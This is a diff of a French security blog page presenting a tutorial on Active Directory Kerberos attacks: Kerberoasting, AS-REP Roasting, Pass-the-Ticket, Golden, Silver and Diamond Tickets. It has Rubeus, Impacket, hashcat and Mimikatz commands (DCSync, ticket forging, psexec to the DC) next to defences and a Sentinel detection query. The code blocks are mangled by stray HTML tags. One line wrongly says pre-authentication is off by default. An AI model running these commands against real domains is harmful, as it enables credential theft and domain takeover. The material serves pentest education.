@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Attaques Kerberos avancées : Kerberoasting et Golden Ticket — Temgus.CyberBlog</title>
 <meta name="description" content="Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden Ticket et Diamond Ticket — attaques et défenses AD.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/kerberos-avance.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/kerberos-avance.html">
 <meta property="og:title" content="Attaques Kerberos avancées : Kerberoasting et Golden Ticket — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Attaques Kerberos avancées : Kerberoasting et Golden Ticket — Temgus.CyberBlog">
 <meta name="twitter:description" content="Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden Ticket et Diamond Ticket — attaques et défenses AD.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,514 @@
   "headline": "Attaques Kerberos avancées : Kerberoasting et Golden Ticket",
   "description": "Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden Ticket et Diamond Ticket — attaques et défenses AD.",
   "datePublished": "2025-08-17",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/kerberos-avance.html",
   "inLanguage": "fr",
   "keywords": "Kerberos, Kerberoasting, Golden Ticket, Active Directory, Mimikatz",
-  "timeRequired": "PT12M"
+  "timeRequired": "PT12M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🎫</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Attaques Kerberos avancées : Kerberoasting et Golden Ticket</h1>
-  <p style="color:#8892a4;max-width:500px">Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden Ticket et Diamond Ticket — attaques et défenses AD.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#kerberos-avance" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🎫</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Attaques Kerberos avancées : Kerberoasting et Golden Ticket</div>
+      <div class="meta-details">
+        <span>📅 2025-08-17</span>
+        <span>⏱ 12 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#rappel-comment-fonctionne-kerberos">Rappel : Comment fonctionne Kerberos</a></li>
+<li><a href="#kerberoasting">Kerberoasting</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#principe">Principe</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#exploitation">Exploitation</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#d-fense-contre-kerberoasting">Défense contre Kerberoasting</a></li>
+<li><a href="#as-rep-roasting">AS-REP Roasting</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#principe">Principe</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#exploitation">Exploitation</a></li>
+<li><a href="#pass-the-ticket">Pass-the-Ticket</a></li>
+<li><a href="#golden-ticket-la-cl-du-royaume">Golden Ticket — La clé du royaume</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#principe">Principe</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#exploitation">Exploitation</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#silver-ticket">Silver Ticket</a></li>
+<li><a href="#diamond-ticket-l-alternative-furtive">Diamond Ticket — L'alternative furtive</a></li>
+<li><a href="#d-tection">Détection</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Attaques Kerberos avancées : Kerberoasting, AS-REP Roasting et Golden Ticket</h1>
+
+<p>Kerberos est le protocole d'authentification d'Active Directory. Comprendre ses failles est essentiel pour tout pentester ciblant des environnements Windows d'entreprise. Ces attaques figurent dans les phases post-exploitation des Red Teams les plus sophistiquées.</p>
+
+<h2 id="rappel-comment-fonctionne-kerberos">Rappel : Comment fonctionne Kerberos</h2>
+
+<pre><code>Flux d'authentification Kerberos :
+
+<li>AS-REQ : L'utilisateur demande un TGT au KDC</li>
+<li>AS-REP : Le KDC répond avec un TGT chiffré (clé = hash mot de passe)</li>
+<li>TGS-REQ : L'utilisateur demande un ticket service (TGS)</li>
+<li>TGS-REP : Le KDC répond avec un TGS chiffré (clé = hash compte service)</li>
+<li>AP-REQ  : L'utilisateur présente le TGS au service</li>
+<li>AP-REP  : Le service accorde l'accès</li>
+
+<p>Composants :</p>
+<p>→ KDC (Key Distribution Center) = Domain Controller</p>
+<p>→ TGT (Ticket Granting Ticket) = "Pass de transport"</p>
+<p>→ TGS (Ticket Granting Service) = "Ticket pour un service spécifique"</p>
+<p>→ SPN (Service Principal Name) = Identifiant d'un service</code></pre>
+
+<h2 id="kerberoasting">Kerberoasting</h2>
+
+<h3 id="principe">Principe</h3>
+
+<pre><code>Kerberoasting exploite le fait que :
+<li>N'importe quel utilisateur authentifié peut demander un TGS</li>
+<li>Le TGS est chiffré avec le hash NTLM du compte de service</li>
+<li>Ce hash peut être cracké hors ligne (offline)</li>
+
+<p>Condition : Il doit exister des comptes avec un SPN (Service Principal Name)</code></pre>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<pre><code class="language-powershell"># Étape 1 : Trouver les comptes avec SPN
+<h1>PowerShell natif</h1>
+<p>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} <code></p>
+<p>-Properties ServicePrincipalName |</p>
+<p>Select-Object Name, ServicePrincipalName</p>
+
+<h1>Avec PowerView</h1>
+<p>Import-Module PowerView</p>
+<p>Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname</p>
+
+<h1>Étape 2 : Demander les TGS (Kerberoasting)</h1>
+<h1>Méthode 1 : Rubeus</h1>
+<p>Rubeus.exe kerberoast /outfile:hashes.txt</p>
+
+<h1>Méthode 2 : Impacket (depuis Linux)</h1>
+<p>GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.1 -request</p>
+
+<h1>Résultat : hash au format $krb5tgs$23$...</h1>
+<h1>$krb5tgs$23$<em>svc_sql</em>DOMAIN<em>SQL/server.domain.com</em>[hash]</h1>
+
+<h1>Étape 3 : Cracker le hash hors ligne</h1>
+<p>hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt</p>
+<p>hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule</code></pre>
+
+<h3 id="d-fense-contre-kerberoasting">Défense contre Kerberoasting</h3>
+
+<pre><code class="language-powershell"># 1. Utiliser des mots de passe longs et complexes pour les comptes de service
+<h1>→ 25+ caractères aléatoires = impossible à cracker</h1>
+
+<h1>2. Utiliser des MSA/gMSA (Managed Service Accounts)</h1>
+<h1>Le mot de passe est géré automatiquement par AD (très long, rotation auto)</h1>
+<p>New-ADServiceAccount -Name "svc-sql" -DNSHostName "sql.domain.com"</p>
+
+<h1>3. Activer AES pour Kerberos (plus difficile à cracker que RC4)</h1>
+<p>Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256</p>
+
+<h1>4. Monitorer les demandes TGS massives (Event ID 4769)</h1>
+<p>Get-WinEvent -FilterHashtable @{</p>
+<p>LogName='Security'</p>
+<p>Id=4769</p>
+<p>} | Where-Object {$_.Properties[5].Value -eq '0x17'}  # RC4 encryption</p>
+<h1>Beaucoup de demandes RC4 en peu de temps = Kerberoasting !</code></pre></h1>
+
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+
+<h3 id="principe">Principe</h3>
+
+<pre><code>AS-REP Roasting cible les comptes avec "Do not require Kerberos preauthentication"
+<p>→ La pré-authentification est désactivée par défaut mais peut être désactivée</p>
+<p>→ Sans pré-auth : n'importe qui peut demander un AS-REP sans s'authentifier</p>
+<p>→ L'AS-REP contient du matériel chiffré avec le hash du mot de passe</code></pre>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<pre><code class="language-bash"># Trouver les comptes vulnérables (pré-auth désactivée)
+<p>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth</p>
+
+<h1>AS-REP Roasting sans credential (depuis le réseau !)</h1>
+<h1>Impacket</h1>
+<p>GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -dc-ip 192.168.1.1</p>
+
+<h1>Avec Rubeus</h1>
+<p>Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt</p>
+
+<h1>Hash format : $krb5asrep$23$user@DOMAIN:[hash]</h1>
+<h1>Cracker</h1>
+<p>hashcat -m 18200 asrep_hashes.txt wordlist.txt</code></pre>
+
+<h2 id="pass-the-ticket">Pass-the-Ticket</h2>
+
+<pre><code class="language-powershell"># Utiliser un ticket Kerberos volé sans connaître le mot de passe
+
+<h1>Voler les tickets en mémoire avec Mimikatz</h1>
+<p>sekurlsa::tickets /export</p>
+<h1>Crée des fichiers .kirbi</h1>
+
+<h1>Importer un ticket dans la session courante</h1>
+<p>kerberos::ptt ticket.kirbi</p>
+
+<h1>Vérifier les tickets chargés</h1>
+<p>klist</p>
+
+<h1>Accéder à la ressource avec le ticket volé</h1>
+<p>dir \\server\share</code></pre>
+
+<h2 id="golden-ticket-la-cl-du-royaume">Golden Ticket — La clé du royaume</h2>
+
+<h3 id="principe">Principe</h3>
+
+<pre><code>Le Golden Ticket est le Saint Graal des attaques AD :
+
+<p>→ Nécessite le hash NTLM du compte KRBTGT (compte spécial KDC)</p>
+<p>→ Permet de créer des TGT FORGÉS pour n'importe quel utilisateur</p>
+<p>→ Valable pendant 10 ans par défaut</p>
+<p>→ Survit aux changements de mot de passe des utilisateurs</p>
+<p>→ Persistance absolue dans le domaine</p>
+
+<p>Comment obtenir le hash KRBTGT :</p>
+<p>→ Compromission du Domain Controller</p>
+<p>→ DCSync attack (si droits suffisants)</p>
+<p>→ Dump de la base NTDS.dit</code></pre>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<pre><code class="language-powershell"># Étape 1 : Obtenir le hash KRBTGT via DCSync
+<h1>Nécessite : Domain Admin ou droits DCSync</h1>
+<p>mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt</p>
+
+<h1>Résultat :</h1>
+<h1>Hash NTLM: 1a2b3c4d5e6f...</h1>
+<h1>Domain SID: S-1-5-21-XXXXXXXXX</h1>
+
+<h1>Étape 2 : Créer le Golden Ticket</h1>
+<p>kerberos::golden /user:fakeadmin /domain:DOMAIN.COM </code></p>
+<p>/sid:S-1-5-21-XXXXXXXXX <code></p>
+<p>/krbtgt:KRBTGT_HASH </code></p>
+<p>/id:500 <code></p>
+<p>/ptt</p>
+
+<h1>Paramètres :</h1>
+<h1>/user : n'importe quel nom (même inexistant !)</h1>
+<h1>/id:500 : RID 500 = Administrateur</h1>
+<h1>/ptt : inject directement en mémoire</h1>
+
+<h1>Étape 3 : Utiliser le Golden Ticket</h1>
+<p>dir \\DC\C$          # Accès au DC</p>
+<p>psexec.exe \\DC cmd  # Shell sur le DC</code></pre>
+
+<h3 id="silver-ticket">Silver Ticket</h3>
+
+<pre><code class="language-powershell"># Silver Ticket = ticket forgé pour UN SERVICE spécifique
+<h1>Nécessite seulement le hash du compte de service (pas KRBTGT)</h1>
+<h1>Moins puissant mais plus discret (pas de communication avec le KDC)</h1>
+
+<p>kerberos::golden /user:admin /domain:DOMAIN.COM </code></p>
+<p>/sid:S-1-5-21-XXXXXXXXX <code></p>
+<p>/target:server.domain.com </code></p>
+<p>/service:cifs <code>           # Service ciblé</p>
+<p>/rc4:SERVICE_ACCOUNT_HASH </code></p>
+<p>/ptt</code></pre>
+
+<h2 id="diamond-ticket-l-alternative-furtive">Diamond Ticket — L'alternative furtive</h2>
+
+<pre><code>Golden Ticket vs Diamond Ticket :
+
+<p>Golden Ticket :</p>
+<p>→ TGT entièrement forgé (n'existe pas dans le KDC)</p>
+<p>→ Détectable : le KDC n'a pas de trace de ce TGT</p>
+<p>→ ATA/MDI peut détecter les TGTs sans AS-REQ correspondant</p>
+
+<p>Diamond Ticket :</p>
+<p>→ Modifie un vrai TGT légitime (demandé normalement)</p>
+<p>→ Beaucoup plus difficile à détecter</p>
+<p>→ La demande AS-REQ est légitime</p>
+<p>→ Seul le contenu du TGT est modifié (ajout de groupes, extension durée)</p>
+
+<h1>Rubeus Diamond Ticket</h1>
+<p>Rubeus.exe diamond /krbkey:KRBTGT_AES_KEY /user:normaluser /password:password /enctype:aes /domain:DOMAIN.COM /dc:DC.DOMAIN.COM /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></pre>
+
+<h2 id="d-tection">Détection</h2>
+
+<pre><code class="language-python"># Event IDs à surveiller pour détecter ces attaques
+
+<p>events_kerberos = {</p>
+<p>"4768": "AS-REQ (demande TGT) - AS-REP Roasting si sans pré-auth",</p>
+<p>"4769": "TGS-REQ - Kerberoasting si beaucoup de RC4 (EncType 0x17)",</p>
+<p>"4771": "Échec pre-auth Kerberos",</p>
+<p>"4624": "Connexion réussie - vérifier les anomalies",</p>
+<p>}</p>
+
+<h1>Requête Sentinel pour détecter Kerberoasting</h1>
+<p>kql_kerberoasting = """</p>
+<p>SecurityEvent</p>
+<p>| where EventID == 4769</p>
+<p>| where TicketEncryptionType == "0x17"  // RC4 = suspect (AES préféré)</p>
+<p>| where ServiceName != "krbtgt"</p>
+<p>| where ServiceName !endswith "$"       // Exclure les comptes machine</p>
+<p>| summarize count() by Account, IpAddress, bin(TimeGenerated, 5m)</p>
+<p>| where count_ &gt; 5                      // Plus de 5 TGS en 5 min = suspect</p>
+<p>"""</p>
+
+<h1>Microsoft Defender for Identity détecte automatiquement :</h1>
+<h1>→ Kerberoasting (volume de TGS RC4)</h1>
+<h1>→ Pass-the-Ticket (ticket utilisé depuis IP différente)</h1>
+<h1>→ Golden Ticket (TGT avec durée anormale ou depuis compte inexistant)</code></pre></h1>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Les attaques Kerberos — Kerberoasting, AS-REP Roasting, Golden/Silver Tickets — représentent les techniques les plus puissantes en post-exploitation Active Directory. La défense passe par des mots de passe longs pour les comptes de service, l'utilisation de gMSA, la surveillance des Event IDs Kerberos et le déploiement de Microsoft Defender for Identity (anciennement ATA).</p>
+
+<p>---</p>
+<p><em>Catégorie : Pentest</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#kerberos-avance" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/ia-cybersecurite.html" class="nav-prev">← Intelligence Artificielle et cybersécurité : opportunités et menaces</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-databases.html" class="nav-next">Sécurité des bases de données : protéger vos données sensibles →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
